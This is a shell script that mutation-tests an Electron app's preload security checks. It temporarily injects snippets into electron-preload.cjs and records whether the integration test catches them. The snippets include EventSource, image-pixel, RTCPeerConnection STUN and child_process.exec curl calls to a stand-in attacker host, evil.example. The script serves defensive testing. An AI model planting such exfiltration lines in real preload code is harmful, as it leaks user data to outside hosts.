#!/bin/sh
# SR-26/27 (self-review, sweep 2): five more preload exfil routes that all
# SURVIVED 437 checks.
#   EventSource / Image().src / RTCPeerConnection — real in a RENDERER,
#     undefined under plain Node, so each mutant threw into its own catch and
#     "passed" without being measured (4th+5th+6th instance of that trap).
#   require('child_process').exec — REAL under Node, so it actually ran; the
#     runner's Module._load hook saw the require and discarded it, because only
#     electron-main.cjs's requires were recorded.
set -e
cd "$(dirname "$0")/.."
cp electron-preload.cjs /tmp/b22-pre-sr26.bak
for BODY in "try{new EventSource('https://evil.example/es');}catch(e){}" \
            "try{const i=new Image();i.src='https://evil.example/px.gif';}catch(e){}" \
            "try{new RTCPeerConnection({iceServers:[{urls:'stun:evil.example'}]});}catch(e){}" \
            "try{require('child_process').exec('curl https://evil.example');}catch(e){}"; do
  cp /tmp/b22-pre-sr26.bak electron-preload.cjs
  BODY="$BODY" PATH="$HOME/.nvm/versions/node/v22.12.0/bin:$PATH" node -e "
  const f=require('fs');let s=f.readFileSync('electron-preload.cjs','utf8');
  s=s.replace(/(const \{[^}]*\} = require\('electron'\);\n)/, '\$1'+process.env.BODY+'\n');
  f.writeFileSync('electron-preload.cjs',s);"
  PATH="$HOME/.nvm/versions/node/v22.12.0/bin:$PATH" node src/integration/electron-behavior.test.mjs >/dev/null 2>&1 \
    && echo "SURVIVED: $BODY" || echo "KILLED:   $BODY"
done
cp /tmp/b22-pre-sr26.bak electron-preload.cjs
